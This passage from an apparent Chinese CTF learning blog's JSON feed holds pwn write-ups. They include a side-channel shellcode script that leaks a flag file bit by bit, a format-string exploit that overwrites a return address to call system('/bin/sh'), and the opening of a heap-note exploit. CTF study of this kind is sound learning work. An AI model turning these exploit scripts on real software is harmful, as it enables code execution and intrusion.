jz的别名,如果是0,跳转L2</span></span><br><span class=\"line\"><span class=\"string\">        .L3:</span></span><br><span class=\"line\"><span class=\"string\">            jmp .L3</span></span><br><span class=\"line\"><span class=\"string\">        .L2:</span></span><br><span class=\"line\"><span class=\"string\">            leave</span></span><br><span class=\"line\"><span class=\"string\">            ret</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span> % j          <span class=\"comment\"># 这个是填充%s变量的</span></span><br><span class=\"line\">        shellcode = asm(shellcode)</span><br><span class=\"line\">        p.send(shellcode+<span class=\"string\">b&quot;\\0&quot;</span>*(<span class=\"number\">0x1000</span>-<span class=\"built_in\">len</span>(shellcode)))</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            p.recv(timeout=<span class=\"number\">1</span>)  <span class=\"comment\"># 1,移位然后或,把新的一位设置为1</span></span><br><span class=\"line\">            c = (c&gt;&gt;<span class=\"number\">1</span>) | <span class=\"number\">128</span>   <span class=\"comment\"># 0000 0000     1000 0000  f 0x66 0b1100110</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> EOFError:   <span class=\"comment\"># 0 , leave ret后EOFError</span></span><br><span class=\"line\">            c = c&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">    sys.stdout.write(<span class=\"built_in\">chr</span>(c))</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"汇编分析\"><a href=\"#汇编分析\" class=\"headerlink\" title=\"汇编分析\"></a>汇编分析</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* open(file=&#x27;flag&#x27;, oflag=0, mode=0) */</span><br><span class=\"line\">   /* push b&#x27;flag\\x00&#x27; */</span><br><span class=\"line\">   push 0x67616c66</span><br><span class=\"line\">   mov rdi, rsp</span><br><span class=\"line\">   xor edx, edx /* 0 */</span><br><span class=\"line\">   xor esi, esi /* 0 */</span><br><span class=\"line\">   /* call open() */</span><br><span class=\"line\">   push SYS_open /* 2 */</span><br><span class=\"line\">   pop rax</span><br><span class=\"line\">   syscall</span><br><span class=\"line\">   mov r8, rax   # 返回值,句柄,</span><br><span class=\"line\">   /* lseek(fd=&#x27;r8&#x27;, offset=0, whence=0)  这是第一次,偏移为0*/</span><br><span class=\"line\">   mov rdi, r8</span><br><span class=\"line\">   xor edx, edx /* 0 */</span><br><span class=\"line\">   xor esi, esi /* 0 */</span><br><span class=\"line\">   /* call lseek() */</span><br><span class=\"line\">   push SYS_lseek /* 8 */</span><br><span class=\"line\">   pop rax</span><br><span class=\"line\">   syscall</span><br><span class=\"line\">   /* call read(&#x27;r8&#x27;, &#x27;rsp&#x27;, 1) */</span><br><span class=\"line\">   xor eax, eax /* SYS_read */</span><br><span class=\"line\">   mov rdi, r8</span><br><span class=\"line\">   push 1</span><br><span class=\"line\">   pop rdx</span><br><span class=\"line\">   mov rsi, rsp</span><br><span class=\"line\">   syscall  # 系统调用号是0 前面xor即可</span><br><span class=\"line\"></span><br><span class=\"line\">           movzx    eax, BYTE PTR [rsp]</span><br><span class=\"line\">           movsx    edx, al</span><br><span class=\"line\">           mov    eax, 0</span><br><span class=\"line\">           mov    ecx, eax</span><br><span class=\"line\">           sar    edx, cl</span><br><span class=\"line\">           mov    eax, edx</span><br><span class=\"line\">           and    eax, 1</span><br><span class=\"line\">           test    eax, eax</span><br><span class=\"line\">           je    .L2</span><br><span class=\"line\">       .L3:</span><br><span class=\"line\">           jmp    .L3</span><br><span class=\"line\">       .L2:</span><br><span class=\"line\">           leave</span><br><span class=\"line\">           ret</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h2><p>调试的话,可以直接pwntools+gdb调,也可以写段汇编自己调试</p>\n<h2 id=\"接收字符分析\"><a href=\"#接收字符分析\" class=\"headerlink\" title=\"接收字符分析\"></a>接收字符分析</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    p.recv(timeout=<span class=\"number\">1</span>)  <span class=\"comment\"># 收到消息了,是1,移位然后或,把新的一位设置为1</span></span><br><span class=\"line\">    c = (c&gt;&gt;<span class=\"number\">1</span>) | <span class=\"number\">128</span>   <span class=\"comment\"># 0000 0000     1000 0000  f 0x66 0b1100110</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> EOFError:       <span class=\"comment\"># 0 </span></span><br><span class=\"line\">    c = c&gt;&gt;<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t以接收f的过程为例, f是 0b01100110 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/side# python3 <span class=\"number\">1.</span>py</span><br><span class=\"line\"><span class=\"number\">0b0</span></span><br><span class=\"line\"><span class=\"number\">0b10000000</span></span><br><span class=\"line\"><span class=\"number\">0b11000000</span></span><br><span class=\"line\"><span class=\"number\">0b1100000</span></span><br><span class=\"line\"><span class=\"number\">0b110000</span></span><br><span class=\"line\"><span class=\"number\">0b10011000</span></span><br><span class=\"line\"><span class=\"number\">0b11001100</span></span><br><span class=\"line\"><span class=\"number\">0b1100110</span></span><br><span class=\"line\">f</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t上面是直接print(bin(c))打印的每次的输出结果,其实不是很好看,补全后就明朗了,就是每次接收一个字符都会往后移动一位,然后前面的就是新的一位</p>\n<p>0b<font color=\"red\">0</font>0000000<br>0b<font color=\"red\">10</font>000000<br>0b<font color=\"red\">110</font>00000<br>0b<font color=\"red\">0110</font>0000<br>0b<font color=\"red\">00110</font>000<br>0b<font color=\"red\">100110</font>00<br>0b<font color=\"red\">1100110</font>0<br>0b<font color=\"red\">01100110</font></p>\n<p>​\t\t刚开始一直不明白是0还是1的时候才会接收到消息,也就是说是,leave;ret;会接收到消息,还是一直jmp会接收到消息,现在看结果是一直jmp会接收到消息,这是为什么呢?</p>\n<p>​\t\t嘶,感觉其实不是接收到了消息,而是时间到了后,也没有报错,就继续往下执行了,但如果是0的话,就会exit退出,然后EOFError,1的话接收时间过了,就执行下面代码了.</p>\n<h2 id=\"留的小尾巴\"><a href=\"#留的小尾巴\" class=\"headerlink\" title=\"留的小尾巴\"></a>留的小尾巴</h2><p>了解一下怎么调试汇编吧..直接编写汇编代码调试</p>\n<p>还没用时间侧信道来做呢…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/",
            "title": "pwn入门-31-DASCTF六月二进制专项-1",
            "date_published": "2023-06-05T09:50:57.000Z",
            "content_html": "<p>​\t\t和哥几个打的这个比赛,虽然只做出了几道题,但是还有几道其实也都差不多了,思路都没问题,还是因为细节的问题,对原理的掌握不够深入导致的问题,还得再好好打基础和巩固.</p>\n<h1 id=\"fooooood\"><a href=\"#fooooood\" class=\"headerlink\" title=\"fooooood\"></a>fooooood</h1><p>​\t\t这道格式化字符串题给自己整的太恶心了..主要是很久不做格式化字符串了,然后当时理解的没那么深入,有些小问题就卡死了…</p>\n<p>​\t\t非栈上的格式化字符串利用, 看到一种方法是可以利用栈上已有的指针,当时也用了,不过不知道为什么利用格式化字符串写数据的时候有问题….回头再专门学一下</p>\n<p>​\t\t这是一条可以利用的链</p>\n<p>​\t\t感觉自己的思路是没有问题的,<font color=\"red\">但是对格式化字符串的一些利用的小点不是很熟悉,就导致了问题</font></p>\n<p>​\t\t<img src=\"/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605163719082.png\" alt=\"image-20230605163719082\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605172305883.png\" alt=\"image-20230605172305883\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t主要分了几部分,先把for循环的i改大一点,因为要循环很多次,然后还要地址泄露,再之后呢,写一个格式化字符串的替换函数,把返回地址修改了就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Give me your name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;test&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%11$p&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)</span></span><br><span class=\"line\">rsp = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;!?&#x27;</span>)[:-<span class=\"number\">2</span>],<span class=\"number\">16</span>)-<span class=\"number\">248</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(rsp))</span><br><span class=\"line\">i = rsp+<span class=\"number\">4</span></span><br><span class=\"line\">i_off = i&amp;<span class=\"number\">0xffff</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(i_off))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(i_off).encode()+<span class=\"string\">b&#x27;c%11$hn&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">40</span>).encode()+<span class=\"string\">b&#x27;c%37$hhn&#x27;</span></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\"># 泄露libc</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%9$p&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">libc.address = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;!?&#x27;</span>)[:-<span class=\"number\">2</span>],<span class=\"number\">16</span>) - <span class=\"number\">240</span>- libc.sym.__libc_start_main</span><br><span class=\"line\"><span class=\"comment\">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述 （1）与（2）两个栈地址在格式化字符串中的偏移</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">overlap</span>(<span class=\"params\">dest,ptr,off1,off2</span>):</span><br><span class=\"line\">    d = dest&amp;<span class=\"number\">0xff</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ptr:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        payload=<span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(d).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(off1).encode()+<span class=\"string\">b&#x27;$hhn&#x27;</span></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">        f=ptr&amp;<span class=\"number\">0xff</span></span><br><span class=\"line\">        payload=<span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(f).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(off2).encode()+<span class=\"string\">b&#x27;$hhn&#x27;</span></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">        d+=<span class=\"number\">1</span></span><br><span class=\"line\">        ptr&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">ret=rsp+<span class=\"number\">0x18</span></span><br><span class=\"line\">ptr=libc.address+<span class=\"number\">0x21112</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(ret&amp;<span class=\"number\">0xffff</span>).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">25</span>).encode()+<span class=\"string\">b&#x27;$hn&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\"># 覆盖返回地址</span></span><br><span class=\"line\">overlap(ret,ptr,<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">overlap(ret+<span class=\"number\">8</span>,libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>).__next__(),<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\">overlap(ret+<span class=\"number\">16</span>,libc.sym.system,<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t自己之前的exp..回头检查下是哪的问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Give me your name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;test&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%31$p.%21$p&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">data = (io.recvline().strip()).decode().split(<span class=\"string\">&#x27;.&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libc_addr = int(data[3],16)-0x20840</span></span><br><span class=\"line\">first_addr = <span class=\"built_in\">int</span>(data[<span class=\"number\">0</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(first_addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libc_addr))</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(ret_addr))</span></span><br><span class=\"line\"><span class=\"comment\">#onegadget = libc_addr + 0x45226</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">31</span>,&#123;<span class=\"number\">0x7fffff</span>:<span class=\"number\">0x7fffff</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;%58248c%31$n&quot;</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%.26204x%30$n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t存储备忘的信息</p>\n<p>%10$p.%15$p.aaa</p>\n<p>%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</p>\n<p>0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x1ffffe540.0xc144e077e3cf5200.0x555555554b60.0x7ffff7a2d840.(nil).37</p>\n<p>为什么不按顺序了…</p>\n<p>0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x3ffffe540.0xb1fb67251108900.0x555555554b60.0x7ffff7a2d840.(nil).0x7fffffffe548test’</p>\n<p>%12$p.%13$p.%14$p.%15$p.aaa</p>\n<p>0x1f7ffcca0.0x555555554a67.(nil).0x7da3d3a4544d517e.aaa37</p>\n<p>%16$p.%17$p.%18$p.%19$p.aaa</p>\n<p>x555555554820.0x7fffffffe540.(nil).(nil).aaa</p>\n<p>%20$p.%21$p.%22$p.%23$p.aaa</p>\n<p>0x4f7197cdb841edfc.0x4f718777df51edfc.(nil).(nil).aaa</p>\n<p>%24$p.%25$p.%26$p.%27$p.aaa</p>\n<p>(nil).0x7fffffffe558.0x7ffff7ffe168.0x7ffff7de780b.aaa</p>\n<p>%28$p.%29$p.%30$p.%31$p.aaa</p>\n<p>(nil).(nil).0x555555554820.0x7fffffffe540.aaa</p>\n<p>%32$p.%33$p.%34$p.%35$p.aaa</p>\n<p>(nil).0x555555554849.0x7fffffffe538.0x1c.aaa</p>\n<p>%36$p.%37$p.%38$p.%39$p.aaa</p>\n<p>0x1.0x7fffffffe79c.(nil).0x7fffffffe7ba.aaa</p>\n<p>0x7fffffffe388</p>\n<p>0xffffe388</p>\n<p>0xe388</p>\n<p>11个位置 -0xd0</p>\n<p><a href=\"https://blog.csdn.net/qq_52877079/article/details/129756543\">https://blog.csdn.net/qq_52877079/article/details/129756543</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/184717\">https://www.anquanke.com/post/id/184717</a></p>\n<h1 id=\"easynote\"><a href=\"#easynote\" class=\"headerlink\" title=\"easynote\"></a>easynote</h1><p>​\t\t简单的一道菜单堆题,看的时候很眼熟很眼熟,果然是之前做过的,只是稍微改动</p>\n<p>​\t\t<a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a></p>\n<p>​\t\t开启了pie,那就用largebin smallbin的main_arena来泄露地址,</p>\n<p>​\t\t这里有个小坑,就是接收返回地址的时候一直接收不到,注意这是因为先接收到了\\n,用recv应该是接收到\\n为止? 所以可以用多个recv或者recvuntil,</p>\n<p>​\t\tmalloc有检测,回头分析源码的时候可以具体看看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\"><span class=\"meta\">#p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,25350)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">#gdb.attach(p)</span></span><br><span class=\"line\">def add(size,content):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;The length of your content ---&gt;&#x27;</span>, str(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Content ---&gt;&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\">def edit(index, size,content):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;The length of your content ---&gt;&#x27;</span>, str(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Content ---&gt;&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def show(index):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def delete(index):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span 